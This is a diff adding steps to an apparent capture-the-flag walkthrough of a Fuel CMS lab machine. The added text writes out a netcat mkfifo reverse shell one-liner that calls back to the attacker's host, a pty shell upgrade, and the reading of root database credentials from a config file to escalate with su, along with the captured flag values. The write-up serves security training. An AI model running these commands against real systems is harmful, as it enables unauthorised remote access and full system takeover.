@@ -33,6 +33,60 @@ Command
 python3 <pythonfile> -u http://<Target IP>
 
 Make sure to be on the directory where the python file is saved. 
+Once the python file has been run, you will able to get the remote access. 
 
+Now, let get the reverse shell connection by using netcat and reverse shell code from Google. 
+Reverse shell command - $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your machine IP> <Port on which you want the connaction>>/tmp/f
+This code was got from - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet >> Netcat
 
+On new terminal use the command 
+nc -lvnp portno 
+nc - netcat - a tool that opens raw network connections and sends/receives data
+-lvnp - listen, numeric, verbose, port 
 
+In hacking, it’s commonly used to:
+listen for reverse shells
+connect to other machine
+move data between systems
+
+Once we get the netcat connection we need to use the command to get the interactive session 
+command 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+It upgrades your dumb shell into an interactive TTY shell.
+
+When you perform whoami, the results shows as www-data
+now, perform ls and check for the usertxt in home directory. 
+
+ls 
+cd /home/www-data
+cat flag.txt 
+
+Result 
+6470e394cbf6dab6a91682cc8585059b
+
+Now, lets check for the root privilege
+Any web application must store database credentials somewhere. so let check for cat fuel/application/config/database.php
+Fuel CMS is written in PHP, and PHP apps usually store config in:
+.php config files
+inside a config/ directory
+
+Fuel CMS follow this structure 
+fuel/
+ └── application/
+     └── config/
+         └── database.php
+From the file, we can see the username and password 
+username =root, password = mememe
+
+Now, use su 
+it will ask for password. Provide password as mememe
+
+check for whoami, it will show the details as root. 
+
+Now got cd /root and check for the files. 
+
+we have root.txt 
+cat root.txt 
+
+Result 
+b9bbcb33e11b80be759c4e844862482d
